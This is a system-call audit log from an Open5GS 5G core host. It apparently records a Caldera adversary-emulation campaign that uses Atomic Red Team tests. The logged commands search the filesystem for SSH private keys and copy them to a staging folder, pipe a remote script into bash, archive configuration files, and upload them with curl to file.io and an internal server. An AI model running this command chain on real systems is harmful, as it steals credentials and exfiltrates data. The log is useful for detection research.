+2026-10-02T20:15:54.123815586Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123831533Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123849406Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123862706Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123875842Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123904326Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.123962955Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.123981504Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.123998048Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.124010499Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.124019899Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.124037323Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.124095696Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.124128670Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.124159642Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.124171328Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.124191726Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.124216834Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.125049124Z | EXEC | PID=974277 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.asc
+2026-10-02T20:15:54.126815462Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126855790Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126859988Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126871735Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126880576Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126900380Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.126950394Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.126968498Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.126988512Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.127000622Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.127017138Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.127046771Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.127116173Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127131716Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127149854Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127162836Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127179151Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127208034Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.127269218Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127285928Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127298957Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127304404Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127312178Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127329936Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.127405792Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.127421772Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.127444743Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.127456296Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.127476764Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.127501759Z | READ | PID=974277 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.129550200Z | EXEC | PID=974281 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.crt
+2026-10-02T20:15:54.132330857Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132386375Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132402786Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132409011Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132416906Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132431265Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.132496702Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132515083Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132535530Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132550084Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132568221Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132599567Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.132699589Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.132716867Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.132735082Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.132748352Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.132779145Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.133820132Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.134128483Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134148783Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134164020Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134406516Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134430224Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134617085Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.134805762Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.134825316Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.134849985Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.134855472Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.134874944Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.135296609Z | READ | PID=974281 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.198329954Z | EXEC | PID=975583 | PPID=937778 | /bin/sh | -c "find / -name id_rsa 2>/dev/null | tee -a /tmp/keyfile_locations.txt /tmp/thesis-discovery.log; exit 0"
+2026-10-02T20:16:36.200470547Z | EXEC | PID=975584 | PPID=975583 | /usr/bin/find | / -name id_rsa
+2026-10-02T20:16:36.200732149Z | EXEC | PID=975585 | PPID=975583 | /usr/bin/tee | -a /tmp/keyfile_locations.txt /tmp/thesis-discovery.log
+2026-10-02T20:16:36.249782715Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249803961Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249823657Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249829867Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249843822Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249850196Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249857875Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249870275Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:16:36.249922857Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.249939907Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.250011989Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.250020717Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.250082705Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.250123670Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:16:36.250180552Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250198550Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250220139Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250233654Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250251591Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250272068Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:16:36.250379114Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250395719Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250406328Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250419430Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250430601Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250448807Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:16:36.250496652Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250508189Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250524905Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250539588Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250554921Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250570182Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:16:36.250627437Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250634372Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250650366Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250655085Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250668619Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250682792Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:16:36.250721163Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250738416Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250749997Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250764853Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250774856Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250786116Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:16:36.250841708Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.250858900Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.250882117Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.250895384Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.250914397Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.250940170Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:16:36.251013038Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251020300Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251028900Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251034081Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251051556Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251072007Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:16:36.251112848Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251129331Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251138563Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251143719Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251157659Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251168748Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:16:36.251212637Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251228942Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251237825Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251245068Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251258952Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251269038Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:16:36.251317916Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251333653Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251343120Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251348459Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251372711Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251382762Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:16:36.251437296Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251444049Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251459908Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251464950Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251479039Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251493904Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:16:36.251542149Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/staged
+2026-10-02T20:16:36.251557615Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/staged
+2026-10-02T20:16:36.251581167Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/staged
+2026-10-02T20:16:36.251594797Z | READ | PID=975584 | /usr/bin/find | /opt/open5gs/staged
+2026-10-02T20:17:30.255402797Z | EXEC | PID=977252 | PPID=937778 | /bin/sh | -c "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \; exit 0"
+2026-10-02T20:17:30.257138708Z | EXEC | PID=977253 | PPID=977252 | /bin/mkdir | /tmp/art-staging
+2026-10-02T20:17:30.260230244Z | EXEC | PID=977254 | PPID=977252 | /usr/bin/find | / -name id_rsa -exec cp --parents {} /tmp/art-staging ; exit 0
+2026-10-02T20:18:24.275380926Z | EXEC | PID=978937 | PPID=937778 | /bin/sh | -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash"
+2026-10-02T20:18:24.277515389Z | EXEC | PID=978938 | PPID=978937 | /usr/bin/curl | -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh
+2026-10-02T20:18:24.277748544Z | EXEC | PID=978939 | PPID=978937 | /bin/bash | 
+2026-10-02T20:18:24.584416419Z | EXEC | PID=978951 | PPID=978937 | /bin/bash | 
+2026-10-02T20:19:15.324778061Z | EXEC | PID=980428 | PPID=937778 | /bin/sh | -c "sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"; sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"; chmod +x /tmp/art.sh; sh /tmp/art.sh"
+2026-10-02T20:19:15.350750147Z | EXEC | PID=980429 | PPID=980428 | /bin/sh | -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
+2026-10-02T20:19:15.378163915Z | EXEC | PID=980432 | PPID=980428 | /bin/sh | -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
+2026-10-02T20:19:15.379871269Z | EXEC | PID=980433 | PPID=980428 | /bin/chmod | +x /tmp/art.sh
+2026-10-02T20:19:15.401914688Z | EXEC | PID=980434 | PPID=980428 | /bin/sh | /tmp/art.sh
+2026-10-02T20:19:15.403988012Z | EXEC | PID=980435 | PPID=980434 | /bin/ping | -c 4 8.8.8.8
+2026-10-02T20:19:58.334200092Z | EXEC | PID=981780 | PPID=937778 | /bin/sh | -c "echo $0; if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi; if $(printenv SHELL >/dev/null); then printenv SHELL; fi"
+2026-10-02T20:19:58.337184151Z | EXEC | PID=981782 | PPID=981781 | /usr/bin/env | 
+2026-10-02T20:19:58.337385059Z | EXEC | PID=981783 | PPID=981781 | /bin/grep | SHELL
+2026-10-02T20:19:58.340027442Z | EXEC | PID=981784 | PPID=981780 | /usr/bin/printenv | SHELL
+2026-10-02T20:20:51.350253220Z | EXEC | PID=983452 | PPID=937778 | /bin/sh | -c "tar -P -zcf /opt/open5gs/staged.tar.gz /opt/open5gs/staged && echo /opt/open5gs/staged.tar.gz"
+2026-10-02T20:20:51.352398490Z | EXEC | PID=983453 | PPID=983452 | /bin/tar | -P -zcf /opt/open5gs/staged.tar.gz /opt/open5gs/staged
+2026-10-02T20:20:51.357710237Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged
+2026-10-02T20:20:51.357825444Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged
+2026-10-02T20:20:51.357898525Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged
+2026-10-02T20:20:51.357930355Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged
+2026-10-02T20:20:51.358728749Z | EXEC | PID=983454 | PPID=983453 | /bin/sh | -c gzip
+2026-10-02T20:20:51.358966230Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/ausf.yaml
+2026-10-02T20:20:51.358985001Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/ausf.yaml
+2026-10-02T20:20:51.359087193Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/amf.yaml
+2026-10-02T20:20:51.359105140Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/amf.yaml
+2026-10-02T20:20:51.359205013Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/debian-logo.png
+2026-10-02T20:20:51.359220254Z | READ | PID=983453 | /bin/tar | /opt/open5gs/staged/debian-logo.png
+2026-10-02T20:20:51.360470100Z | EXEC | PID=983455 | PPID=983454 | /bin/gzip | 
+2026-10-02T20:20:51.362023256Z | WRITE | PID=983455 | /bin/gzip | /opt/open5gs/staged.tar.gz
+2026-10-02T20:20:51.362075939Z | WRITE | PID=983455 | /bin/gzip | /opt/open5gs/staged.tar.gz
+2026-10-02T20:21:48.405909434Z | WRITE | PID=937778 | /opt/open5gs/splunkd | /opt/open5gs/3945c9_artifact
+2026-10-02T20:21:48.405944865Z | WRITE | PID=937778 | /opt/open5gs/splunkd | /opt/open5gs/3945c9_artifact
+2026-10-02T20:21:48.407812061Z | EXEC | PID=985215 | PPID=937778 | /bin/sh | -c "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/"
+2026-10-02T20:21:48.409881295Z | EXEC | PID=985216 | PPID=985215 | /usr/bin/curl | -F file=@3945c9_artifact -F maxDownloads=1 -F autoDelete=true https://file.io/
+2026-10-02T20:21:48.489696589Z | READ | PID=985216 | /usr/bin/curl | /opt/open5gs/3945c9_artifact
+2026-10-02T20:21:48.489718861Z | READ | PID=985216 | /usr/bin/curl | /opt/open5gs/3945c9_artifact
+2026-10-02T20:21:48.489739124Z | READ | PID=985216 | /usr/bin/curl | /opt/open5gs/3945c9_artifact
+2026-10-02T20:21:48.489742752Z | READ | PID=985216 | /usr/bin/curl | /opt/open5gs/3945c9_artifact
+2026-10-02T20:22:39.215544922Z | EXEC | PID=986724 | PPID=937778 | /bin/sh | -c "curl -F "data=@/opt/open5gs/staged.tar.gz" --header "X-Request-ID: `hostname`-udzshr" http://192.168.100.69:8888/file/upload"
+2026-10-02T20:22:39.222526815Z | EXEC | PID=986725 | PPID=986724 | /bin/hostname | 
+2026-10-02T20:22:39.229003718Z | EXEC | PID=986726 | PPID=986724 | /usr/bin/curl | -F data=@/opt/open5gs/staged.tar.gz --header "X-Request-ID: open5gs-0078507098-udr-85f67d65d8-mc5sn-udzshr" http://192.168.100.69:8888/file/upload
+2026-10-02T20:22:39.243863131Z | READ | PID=986726 | /usr/bin/curl | /opt/open5gs/staged.tar.gz
+2026-10-02T20:22:39.243882977Z | READ | PID=986726 | /usr/bin/curl | /opt/open5gs/staged.tar.gz
+2026-10-02T20:22:39.243916969Z | READ | PID=986726 | /usr/bin/curl | /opt/open5gs/staged.tar.gz
+2026-10-02T20:22:39.243921183Z | READ | PID=986726 | /usr/bin/curl | /opt/open5gs/staged.tar.gz
+2026-10-02T20:23:37.268900635Z | EXEC | PID=988562 | PPID=937778 | /bin/sh | -c "echo "Caldera: End of Campaign""
